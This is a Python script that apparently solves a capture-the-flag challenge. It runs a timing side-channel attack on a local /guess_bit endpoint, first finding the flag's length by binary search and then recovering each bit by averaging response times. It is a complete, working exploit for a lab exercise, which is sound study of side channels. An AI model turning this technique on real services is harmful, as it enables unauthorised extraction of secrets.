import requests
import time 
from Crypto.Util.number import *

r = requests.Session()
url = 'http://127.0.0.1:5000'

def guess_bit(index:int):
    return r.get(f"{url}/guess_bit?bit={index}").json()

def guess_bit_timing(index:int):
    time_start = time.time_ns()
    ans = r.get(f"{url}/guess_bit?bit={index}").json()
    time_end = time.time_ns()
    return ans, time_end - time_start

def find_length():
    msg = guess_bit(0)
    low = 0
    #i think 1000 bits for flag enough
    high = 1000
    #binary search for smart people :D
    while low <= high:
        middle = (low + high)//2
        msg = guess_bit(middle)
        if "error" in msg.keys():
            high = middle - 1 
        else:
            low = middle + 1
    #from zero to length of flag - 1
    return low

length = find_length()

def medium_time(index, attempts = 50):
    timings = []

    # hardcoded 50 is a random number
    for _ in range(attempts):
        timings.append(guess_bit_timing(index)[1])
    return sum(timings)/len(timings)

#we know, that bin(flag)[-2], so bin(flag)[length-2] = '0'
#lets find medium time for guessing of zero bit 
MED_ZERO_TIME = medium_time(length - 2)

#first bit is always 1, so let find medium time for 1
MED_ONE_TIME = medium_time(0)

#MED_ONE_TIME is about ten times bigger than MED_ZERO_TIME time 
#so let use this var to divide zeroes from ones
MED_TO_DIVIDE = (MED_ZERO_TIME + MED_ONE_TIME)/2


def timing_attack_for_bit(index):
    bit_time = medium_time(index, 10)
    return '1' if bit_time > MED_TO_DIVIDE else '0'

def retrieve_flag():
    flag = ''
    for i in range(length):
        flag += timing_attack_for_bit(i)
    return long_to_bytes(int(flag,2)).decode()
if __name__ == "__main__":
    print(retrieve_flag())
